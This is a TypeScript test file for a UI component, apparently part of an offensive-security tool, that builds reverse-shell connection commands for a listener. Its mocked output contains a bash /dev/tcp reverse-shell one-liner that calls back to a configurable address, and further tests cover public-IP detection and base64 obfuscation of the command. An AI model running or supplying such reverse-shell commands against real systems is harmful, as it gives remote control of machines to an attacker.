import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { useChatStore } from '@/stores';
import { SHELL_IPC, type ReverseListenerProfile } from '@electron/contracts/shell';
import { ShellConnectBuilder } from '@/components/left-panel/ShellConnectBuilder';

const listener: ReverseListenerProfile = {
  id: 'listener-1',
  name: 'Loopback listener',
  bindAddress: '127.0.0.1',
  port: 4444,
  shellFlavor: 'raw',
  createdAt: '2026-08-03T00:00:00.000Z',
  updatedAt: '2026-08-03T00:00:00.000Z',
};

const templates = [{
  id: 'bash-tcp' as const,
  label: 'Bash TCP',
  target: 'Linux / WSL',
  runtime: 'Bash with /dev/tcp support',
  shell: '/bin/bash',
  pty: 'partial' as const,
  note: 'Local fixture only.',
}];

describe('ShellConnectBuilder', () => {
  const invoke = vi.fn(async (channel: string, request?: Record<string, unknown>) => {
    if (channel === SHELL_IPC.CONNECT_TEMPLATE_LIST) return templates;
    if (channel === SHELL_IPC.PUBLIC_IP_DETECT) return '203.0.113.5';
    if (channel === SHELL_IPC.CONNECT_COMMAND_BUILD) return {
      listenerId: 'listener-1',
      template: templates[0],
      callbackAddress: request?.callbackAddress ?? '127.0.0.1',
      callbackPort: request?.callbackPort ?? 4444,
      command: `bash -c 'bash -i >& /dev/tcp/${request?.callbackAddress ?? '127.0.0.1'}/${request?.callbackPort ?? 4444} 0>&1'`,
      localOnly: request?.callbackAddress === '127.0.0.1' || String(request?.callbackAddress ?? '').startsWith('127.'),
      obfuscation: (request?.obfuscation as string) || 'none',
      warning: 'Hexestra never executes this command automatically.',
    };
    return undefined;
  });

  beforeEach(() => {
    vi.clearAllMocks();
    Object.defineProperty(window, 'hexestra', {
      configurable: true,
      value: { invoke, on: vi.fn(() => () => {}), once: vi.fn(), send: vi.fn() },
    });
    useChatStore.setState({
      composerText: 'Keep my draft',
      composerContextRefs: [],
      composerFocusNonce: 0,
    });
  });

  it('builds, copies, and queues a command without executing or sending it', async () => {
    render(<ShellConnectBuilder projectId="project-1" listener={listener} onClose={vi.fn()} />);
    const preview = await screen.findByLabelText('Generated connection command');
    await waitFor(() => expect((preview as HTMLTextAreaElement).value).toContain('/dev/tcp/127.0.0.1/4444'));
    expect(screen.getByText('Bash with /dev/tcp support')).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
    await waitFor(() => expect(invoke).toHaveBeenCalledWith(
      'clipboard:write-text',
      expect.stringContaining('/dev/tcp/127.0.0.1/4444'),
    ));
    expect(screen.getByText('Copied.')).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Ask Agent' }));
    fireEvent.click(screen.getByRole('button', { name: 'Ask Agent' }));
    expect(useChatStore.getState().composerText).toBe('Keep my draft');
    expect(useChatStore.getState().composerContextRefs).toEqual([
      expect.objectContaining({ kind: 'shell-command', listenerId: 'listener-1' }),
    ]);
    expect(screen.getByText(/was not sent/)).toBeInTheDocument();
    expect(invoke).not.toHaveBeenCalledWith('agent:send', expect.anything());
  });

  it('uses a user-entered callback address', async () => {
    render(<ShellConnectBuilder projectId="project-1" listener={listener} onClose={vi.fn()} />);
    const input = screen.getByLabelText('Callback address');
    fireEvent.change(input, { target: { value: '192.168.1.20' } });
    await waitFor(() => expect(invoke).toHaveBeenCalledWith(
      SHELL_IPC.CONNECT_COMMAND_BUILD,
      expect.objectContaining({ callbackAddress: '192.168.1.20' }),
    ));
  });

  it('detects public IP via the Detect button', async () => {
    render(<ShellConnectBuilder projectId="project-1" listener={listener} onClose={vi.fn()} />);
    fireEvent.click(screen.getByRole('button', { name: 'Detect' }));
    await waitFor(() => expect(invoke).toHaveBeenCalledWith(SHELL_IPC.PUBLIC_IP_DETECT));
    await waitFor(() => expect(screen.getByText('Public IP detected.')).toBeInTheDocument());
    expect(screen.getByLabelText<HTMLInputElement>('Callback address').value).toBe('203.0.113.5');
  });

  it('passes obfuscation selection to the build request', async () => {
    render(<ShellConnectBuilder projectId="project-1" listener={listener} onClose={vi.fn()} />);
    await screen.findByLabelText('Generated connection command');
    const obfuscationSelect = screen.getByLabelText('Obfuscation');
    fireEvent.change(obfuscationSelect, { target: { value: 'base64' } });
    await waitFor(() => expect(invoke).toHaveBeenCalledWith(
      SHELL_IPC.CONNECT_COMMAND_BUILD,
      expect.objectContaining({ obfuscation: 'base64' }),
    ));
  });
});
